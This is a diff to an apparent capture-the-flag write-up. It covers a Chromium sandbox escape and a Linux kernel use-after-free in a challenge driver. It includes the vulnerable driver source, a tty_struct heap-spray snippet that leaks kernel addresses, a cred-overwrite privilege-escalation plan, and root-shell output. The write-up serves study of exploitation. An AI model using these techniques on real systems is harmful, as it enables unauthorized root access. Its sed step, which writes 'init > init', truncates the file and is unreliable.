@@ -724,8 +724,181 @@ let shellcode = [8.689034976057858e-308, 5.629558420881076e-308, 2.8147792104405
 
 yudai has a nice [ptrlib](https://bitbucket.org/ptr-yudai/ptrlib/src/master/) python library that can be `git clone`d or `pip install`d. It was used here to compile assembly with `nasm` and then chunk the opcodes into 64-bit with `0x90` NOPs as padding. Then the chunks are converted into floats. Finally, sed-like replacement of the `shellcode` variable is performed on the `HTML` file.
 
+The command-line output upon running the browser exploit successfully will look like:
+```
+[1107/100031.042497:INFO:CONSOLE(71)] "[+] offset = 164656", source: file:///home/user/Public/chromium/sbx_exploit.js (71)
+[1107/100031.042532:INFO:CONSOLE(76)] "[+] addr_ctfi = 0x3cbe009a9540", source: file:///home/user/Public/chromium/sbx_exploit.js (76)
+[1107/100031.042548:INFO:CONSOLE(77)] "[+] addr_elm = 0x3cbe00867bc0", source: file:///home/user/Public/chromium/sbx_exploit.js (77)
+[1107/100031.042561:INFO:CONSOLE(78)] "[+] chrome_base = 0x561d6d12e000", source: file:///home/user/Public/chromium/sbx_exploit.js (78)
+[1107/100031.042832:INFO:CONSOLE(86)] "[+] Probing victim...", source: file:///home/user/Public/chromium/sbx_exploit.js (86)
+[1107/100031.067209:INFO:CONSOLE(111)] "[+] Found victim!", source: file:///home/user/Public/chromium/sbx_exploit.js (111)
+[1107/100031.088215:INFO:CONSOLE(176)] "[+] Done", source: file:///home/user/Public/chromium/sbx_exploit.js (176)
+$
+```
+
+Now, onto escalating privileges!
+
 **Privilege escalation**
 
+#### How do we debug the kernel?
+
+Before we get started, first we can do some housekeeping.
+
+We are provided the `run_qemu.py` script, `rootfs.img` ext4 filesystem image, and `bzImage` kernel file. By default, the `/init` script will run the `run_chromium.py` script on entry to userland.
+
+We can make our lives easier and focus solely on the kernel exploit and disregard the browser stuff by modifying what we've been given to just run a user-privileged shell.
+
+Mount the `rootfs.img` and edit the `/init` script in the filesystem. Replace the line that runs chromium (`su -c '/usr/bin/python3 /run_chromium.py' ctf`) with a shell for the `ctf` user (`su -c /bin/sh ctf`).
+```bash
+# mount rootfs.img mnt_dir # this probably requires root-privileges
+# sed -e 's|su -c.*|su -c "/bin/sh" ctf|' -e 's|poweroff .*|#|' init > init
+```
+
+For debugging, we could remove the `ctf` user-privilege from the `su -c /bin/sh` command in the `/init` script and just get a root-privileged shell so we can get kernel addresses for the kernel module via `lsmod` or use `dmesg` to help debug our assumptions.
+
+An easy way of testing the kernel exploit, is to mount the `rootfs.img` and simply copy over the executable binary file.
+
+To enable kernel debugging of the QEMU system, we can pass the `-s` flag (shorthand for -gdb tcp::1234) to the `run_qemu.py` `subprocess` command and attach to the gdb server with `gdb`.
+
+Connect to the QEMU gdbserver stub with the `target remote` command and import the `bzImage` kernel file for symbols if there are any. 
+
+```
+gdb> target remote localhost:1234
+gdb> file bzImage
+gdb> file ctf.ko
+```
+
+QEMU's gdbserver stub has some pitfalls, so there are a variety of projects that are helpful for getting more information.
+* https://github.com/martinradev/gdb-pt-dump
+* https://github.com/bata24/gef - gef fork with QEMU-supporting features
+
+#### So what's the kernel bug?
+
+The challenge introduces a bug into the Linux kernel with a vulnerable kernel driver called `ctf.ko`.
+
+Looking at the source-code, there is a use-after-free vulnerability (also called a dangling pointer) where after free'ing the kernel object, `read`s and `write`s to the pointer are still permitted.
+
+The C code below shows that the pointer is not NULLed after freeing.
+```C
+static ssize_t ctf_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
+{
+  struct ctf_data *data = f->private_data;
+  char *mem;
+  switch(cmd) {
+  case 1337:
+    if (arg > 2000) {
+      return -EINVAL;
+    }
+    mem = kmalloc(arg, GFP_KERNEL);
+    if (mem == NULL) {
+      return -ENOMEM;
+    }
+    data->mem = mem;
+    data->size = arg;
+    break;
+  case 1338:
+    kfree(data->mem); // data->mem pointer is not set to NULL after freeing
+    break;
+  default:
+    return -ENOTTY;
+  }
+  return 0;
+}
+```
+
+The C code below shows that the user can still read and write to the pointer.
+```C
+static ssize_t ctf_read(struct file *f, char __user *data, size_t size, loff_t *off)
+{
+  struct ctf_data *ctf_data = f->private_data;
+  if (size > ctf_data->size) {
+    return -EINVAL;
+  }
+  if (copy_to_user(data, ctf_data->mem, size)) { // we can still read from data->mem after free'ing
+    return -EFAULT;
+  }
+  return size;
+}
+
+static ssize_t ctf_write(struct file *f, const char __user *data, size_t size, loff_t *off)
+{
+  struct ctf_data *ctf_data = f->private_data;
+  if (size > ctf_data->size) {
+    return -EINVAL;
+  }
+  if (copy_from_user(ctf_data->mem, data, size)) { // we can still write to data->mem after free'ing
+    return -EFAULT;
+  }
+  return size;
+}
+```
+
+Now that we understand the vulnerability, what is a useful kernel object we can overlap with to re-use the free'd chunk and access with our dangling pointer?
+
+yudai uses `tty_struct` which is a kernel object created when we call `open("/dev/ptmx", O_NOCTTY | O_RDONLY)` from userland. It can be used to leak the kernel pointer, heap pointer and control the program counter.
+
+We can spray this structure after freeing and it is likely that we will overlap with the vulnerable kernel object we've freed.
+
+```C
+  /* Leak addresses */
+  dev_new(0x3f0);
+  dev_delete();
+  for (int i = 0; i < 0x100; i++) {
+    spray[i] = open("/dev/ptmx", O_NOCTTY | O_RDONLY);
+  }
+  memset(buf, 0, sizeof(buf));
+  dev_read((void*)buf, 0x2e0);
+  kbase = buf[3] - (0xffffffff820745e0 - 0xffffffff81000000);
+  kheap = buf[8] - 0x38;
+  printf("[+] kbase = 0x%lx\n", kbase);
+  printf("[+] kheap = 0x%lx\n", kheap);
+```
+
+Now that our address-leak is complete, what do we do now?
+
+Privilege escalation can be achieved by:
+1. calling `commit_creds(prepare_kernel_cred(NULL))`
+2. overwiting EUID of the cred structure of the current process
+3. overwrite `core_pattern`
+4. overwrite `modprobe_path`
+
+yudai decides to overwrite the cred structure. For performing this overwrite, it is useful to build arbitrary-address-read and arbitrary-address-write exploit primitives.
+
+Our current use-after-free with the `tty_struct` object permits us to control the program counter. Interestingly, there is a [technique](https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html) for converting program counter control into each of those exploit primitives by looking for a ROP gadget that looks like `mov rax, [rdx]; ret;` for arbitrary-address-read and a ROP gadget that looks like `mov [rdx], ecx; ret;` for arbitrary-address-write.
+
+Now, we need to find the `task_struct` structure in order to overwrite the `EUID` in `cred`. Interestingly, there is a [comm](https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/sched.h#L847) member variable in the `task_struct` whose value is a string representing the executable's name that can be changed with the C code `prctl(PR_SET_NAME, "HELLO");`. This string can be used as a magic-value to search kernel memory with the arbitrary-address-read primitive for the `task_struct` object.
+
+Upon finding the matching value, the `cred` pointer can be read with the arbitrary-address-read, then the arbitrary-address-write can be performed to overwrite the `EUID` and finally privileges will be escalated!
+
+Successful exploitation using yudai's exploit looks like:
+```bash
+ctf@(none):/$ ./pwn
+[+] kbase = 0xffffffffb9600000
+[+] kheap = 0xffffa14b023d9400
+[*] Searching... (0xffffa14b02300008)
+[*] Searching... (0xffffa14b02200008)
+[*] Searching... (0xffffa14b02100008)
+[*] Searching... (0xffffa14b02000008)
+[*] Searching... (0xffffa14b01f00008)
+[*] Searching... (0xffffa14b01e00008)
+[*] Searching... (0xffffa14b01d00008)
+[*] Searching... (0xffffa14b01c00008)
+[*] Searching... (0xffffa14b01b00008)
+[*] Searching... (0xffffa14b01a00008)
+[*] Searching... (0xffffa14b01900008)
+[*] Searching... (0xffffa14b01800008)
+[*] Searching... (0xffffa14b01700008)
+[*] Searching... (0xffffa14b01600008)
+[*] Searching... (0xffffa14b01500008)
+[*] Searching... (0xffffa14b01400008)
+[*] Searching... (0xffffa14b01300008)
+[+] Found: 0xffffa14b012221c8
+[+] cred = 0xffffa14b0256df00
+bash: cannot set terminal process group (82): Inappropriate ioctl for device
+bash: no job control in this shell
+root@(none):/# id
+uid=0(root) gid=0(root) groups=0(root),1000(ctf)
+```
 
 #### References
 
